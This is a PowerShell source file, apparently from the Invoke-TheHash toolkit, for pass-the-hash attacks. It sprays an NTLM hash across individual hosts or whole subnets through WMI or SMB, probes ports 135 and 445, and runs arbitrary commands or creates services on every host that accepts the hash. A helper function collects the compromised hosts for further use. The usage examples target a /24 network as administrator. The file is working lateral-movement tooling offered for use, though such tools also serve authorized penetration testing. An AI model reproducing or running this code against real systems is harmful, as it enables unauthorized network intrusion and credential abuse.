function Invoke-TheHash
{
<#
.SYNOPSIS
Invoke-TheHash has the ability to target multiple hosts with Invoke-SMBExec or Invoke-WMIExec. This function is
primarily for checking a hash against multiple systems. The function can also be used to execute commands
on multiple systems. Note that in most cases it's advisable to just open a single shell and then use other tools 
from within that session.

.PARAMETER Type
Sets the desired Invoke-TheHash function. Set to either WMIExec or SMBExec.

.PARAMETER Targets
List of hostnames, IP addresses, or CIDR notation for targets.

.PARAMETER TargetsExclude
List of hostnames and/or IP addresses to exclude form the list or targets. Note that the format
(hostname vs IP address) must match the format used with the Targets parameter. For example, if the host was added
to Targets within a CIDR notation, it must be excluded as an IP address.

.PARAMETER PortCheckDisable
(Switch) Disable WMI or SMB port check. Since this function is not yet threaded, the port check serves to speed up
the function by checking for an open WMI or SMB port before attempting a full synchronous TCPClient connection.

.PARAMETER PortCheckTimeout
Default = 100: Set the no response timeout in milliseconds for the WMI or SMB port check.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: SMBExec type only. Prepend %COMSPEC% /C to Command.

.PARAMETER Service
Default = 20 Character Random: SMBExec type only. Name of the service to create and delete on the target.

.PARAMETER SMB1
(Switch) Force SMB1. SMBExec type only. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the
target.

.PARAMETER Sleep
Default = WMI 10 Milliseconds, SMB 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.EXAMPLE
Invoke-TheHash -Type WMIExec -Targets 192.168.100.0/24 -TargetsExclude 192.168.100.50 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
$target_output = Invoke-TheHash -Type WMIExec -Targets 192.168.100.0/24 -TargetsExclude 192.168.100.50 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
$target_list = ConvertTo-TargetList $target_output
Invoke-TheHash -Type WMIExec -Targets $target_list -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][Array]$Targets,
    [parameter(Mandatory=$false)][Array]$TargetsExclude,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(Mandatory=$true)][ValidateSet("SMBExec","WMIExec")][String]$Type,
    [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
    [parameter(Mandatory=$false)][Int]$Sleep,
    [parameter(Mandatory=$false)][Switch]$SMB1
)

$target_list = New-Object System.Collections.ArrayList
$target_list_singles = New-Object System.Collections.ArrayList
$target_list_subnets = New-Object System.Collections.ArrayList

if($Type -eq 'WMIExec')
{
    $Sleep = 10
}
else
{
    $Sleep = 150
}

# subnet parsing code borrowed heavily from Rich Lundeen's Invoke-Portscan
foreach($target in $Targets)
{

    if($target.contains("/"))
    {
        $target_split = $target.split("/")[0]
        [uint32]$subnet_mask_split = $target.split("/")[1]

        $target_address = [System.Net.IPAddress]::Parse($target_split)

        if($subnet_mask_split -ge $target_address.GetAddressBytes().Length * 8)
        {
            throw "Subnet mask is not valid"
        }

        $target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))

        $target_start_address = $target_address.GetAddressBytes()
        [array]::Reverse($target_start_address)

        $target_start_address = [System.BitConverter]::ToUInt32($target_start_address,0)
        [uint32]$target_subnet_mask_start = ([System.math]::Pow(2, $subnet_mask_split)-1) * ([System.Math]::Pow(2,(32 - $subnet_mask_split)))
        $target_start_address = $target_start_address -band $target_subnet_mask_start

        $target_start_address = [System.BitConverter]::GetBytes($target_start_address)[0..3]
        [array]::Reverse($target_start_address)

        $target_address = [System.Net.IPAddress] [byte[]] $target_start_address

        $target_list_subnets.Add($target_address.IPAddressToString) > $null

        for ($i=0; $i -lt $target_count-1; $i++)
        {
            $target_next =  $target_address.GetAddressBytes()
            [array]::Reverse($target_next)
            $target_next =  [System.BitConverter]::ToUInt32($target_next,0)
            $target_next ++
            $target_next = [System.BitConverter]::GetBytes($target_next)[0..3]
            [array]::Reverse($target_next)

            $target_address = [System.Net.IPAddress] [byte[]] $target_next
            $target_list_subnets.Add($target_address.IPAddressToString) > $null
        }

        $target_list_subnets.RemoveAt(0)
        $target_list_subnets.RemoveAt($target_list_subnets.Count - 1)

    }
    else
    {
        $target_list_singles.Add($target) > $null
    }

}

$target_list.AddRange($target_list_singles)
$target_list.AddRange($target_list_subnets)

foreach($target in $TargetsExclude)
{
    $target_list.Remove("$Target")
}

foreach($target in $target_list)
{

    if($type -eq 'WMIExec')
    {

        if(!$PortCheckDisable)
        {
            $WMI_port_test = New-Object System.Net.Sockets.TCPClient
            $WMI_port_test_result = $WMI_port_test.BeginConnect($target,"135",$null,$null)
            $WMI_port_test_success = $WMI_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
            $WMI_port_test.Close()
        }

        if($WMI_port_test_success -or $PortCheckDisable)
        {
            Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target $target -sleep $Sleep
        }

    }
    elseif($Type -eq 'SMBExec')
    {

        if(!$PortCheckDisable)
        {
            $SMB_port_test = New-Object System.Net.Sockets.TCPClient
            $SMB_port_test_result = $SMB_port_test.BeginConnect($target,"445",$null,$null)
            $SMB_port_test_success = $SMB_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
            $SMB_port_test.Close()
        }

        if($SMB_port_test_success -or $PortCheckDisable)
        {
            Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target $target -smb1:$smb1 -sleep $Sleep
        }
        
    }
     
}

}

function ConvertTo-TargetList
{
<#
.SYNOPSIS
ConvertTo-TargetList converts an Invoke-TheHash output array to an array that contains only targets discovered to
have Invoke-WMIExec or Invoke-SMBExec access. The output of this function can be passed back into Invoke-TheHash
through the Targets parameter.

.PARAMETER $OutputArray
The output array returned by Invoke-TheHash.

.EXAMPLE
$target_output = Invoke-TheHash -Type WMIExec -Targets 192.168.100.0/24 -TargetsExclude 192.168.100.50 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0
$target_list = ConvertTo-TargetList $target_output
Invoke-TheHash -Type WMIExec -Targets $target_list -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>

[CmdletBinding()]
param ([parameter(Mandatory=$true)][Array]$Invoke_TheHash_Output)

$target_list = New-Object System.Collections.ArrayList

foreach($target in $ITHOutput)
{
        
    if($target -like "* on *" -and $target -notlike "* denied *" -and $target -notlike "* failed *" -and $target -notlike "* is not *")
    {
        $target_index = $target.IndexOf(" on ")
        $target_index += 4
        $target = $target.SubString($target_index,($target.Length - $target_index))
        $target_list.Add($target) > $null
    }

}

return $target_list
}
